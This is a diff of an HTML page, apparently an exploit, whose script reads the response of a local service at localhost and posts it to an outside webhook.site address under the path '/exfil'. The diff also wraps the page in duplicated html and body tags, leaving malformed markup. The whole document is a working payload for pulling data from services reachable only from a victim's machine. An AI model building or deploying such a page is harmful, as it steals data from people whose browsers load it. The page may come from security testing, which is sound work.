@@ -1,8 +1,11 @@
 <!DOCTYPE html>
 <html>
 <body>
+<!DOCTYPE html>
+<html>
+<body>
 <script>
-fetch('http://127.0.0.1')
+fetch('http://localhost:PORT/')
   .then(r => r.text())
   .then(data => {
     fetch('https://75e190cb-04d7-4537-ba9e-101ec4714bf8.webhook.site/exfil', {
@@ -17,5 +20,7 @@ fetch('http://127.0.0.1')
     });
   });
 </script>
+</body>
+</html>
 </body>
 </html>
